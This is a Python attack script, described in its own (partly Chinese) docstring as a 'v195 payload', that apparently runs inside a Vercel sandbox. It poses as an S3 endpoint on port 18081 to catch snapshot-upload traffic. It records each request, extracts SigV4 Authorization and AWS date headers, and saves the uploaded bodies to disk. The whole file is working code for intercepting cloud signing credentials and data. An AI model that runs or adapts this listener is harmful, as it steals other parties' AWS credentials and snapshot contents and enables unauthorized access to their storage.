# -*- coding: utf-8 -*-
"""v195 payload (guest listener): 宿主 netns S3 监听, 等待用户触发 CreateSnapshot
记录所有请求到 /vercel/sandbox/v195l.out + 提取 SigV4 Authorization"""
import socket, time, json, os, signal, threading

OUT = '/vercel/sandbox/v195l.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(180)

RECV = []
LOCK = threading.Lock()


def log(s, maxlen=2000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def listener():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(('0.0.0.0', 18081))
        srv.listen(20)
        srv.settimeout(1)
        log('LISTENER UP')
        end = time.time() + 150
        while time.time() < end:
            try:
                c, a = srv.accept()
            except socket.timeout:
                continue
            c.settimeout(5)
            try:
                d = b''
                while True:
                    x = c.recv(65536)
                    if not x:
                        break
                    d += x
                    if len(d) > 3000000:
                        break
            except Exception:
                pass
            try:
                c.sendall(b'HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}')
            except Exception:
                pass
            c.close()
            with LOCK:
                RECV.append((a, d))
                log('RECV from %s %d bytes' % (a, len(d)))
                for line in d.split(b'\r\n'):
                    if line[:16].lower() == b'authorization: ':
                        log('AUTH: %r' % line[:800])
                    if line[:12].lower() == b'x-amz-date' or line[:8].lower() == b'amz-sdk':
                        log('HDR: %r' % line[:300])
                hb = d.split(b'\r\n\r\n', 1)
                if len(hb) > 1 and len(hb[1]) > 100:
                    fn = '/vercel/sandbox/v195up%d.bin' % len(RECV)
                    try:
                        open(fn, 'wb').write(hb[1])
                        log('SAVED %s %d bytes' % (fn, len(hb[1])))
                    except Exception as e:
                        log('SAVE EXC %s' % e)
        srv.close()
        log('LISTENER CLOSED')
    except Exception as e:
        log('LISTENER EXC %s' % e)


t = threading.Thread(target=listener, daemon=True)
t.start()
log('V195L_START')
# 主线程保持
try:
    while True:
        time.sleep(5)
except Exception:
    pass
log('V195L_DONE')
f.close()
